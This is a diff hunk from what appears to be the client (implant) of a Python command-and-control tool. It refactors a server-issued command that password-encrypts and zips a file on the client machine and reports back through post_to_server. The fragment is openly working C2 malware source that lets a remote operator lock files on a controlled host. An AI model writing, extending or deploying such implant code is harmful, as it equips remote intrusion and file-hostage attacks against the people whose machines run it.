@@ -105,17 +105,16 @@ while True:
             continue
         filename = path.basename(filepath)
         try:
-            filepath = cmd.split()[2] # command client download FILENAME
-            
-            with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
-                zip_file.setpassword(ZIP_PASSWORD)
-
-                if path.isdir(filepath):
-                    post_to_server(f"{filepath} on {client} is a directory. Only files can be zipped.\n") # v1.0 of zipper
-                else:
+            if path.isdir(filepath):
+                post_to_server(f"{filepath} on {client} is a directory. Only files can be zipped.\n")
+            elif not path.isfile(filepath):
+                raise OSError
+            else:
+                with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
+                    zip_file.setpassword(ZIP_PASSWORD)
                     zip_file.write(filepath, filename)
                     post_to_server(f"{filepath} is now zip-encrypted on {client}.\n")
-        except (PermissionError, OSError):
+        except OSError:
             post_to_server(f"Unable to access {filepath} on {client}.\n")
 
     elif cmd.startswith(C2Commands.CLS_UZIP.value): # client unzip
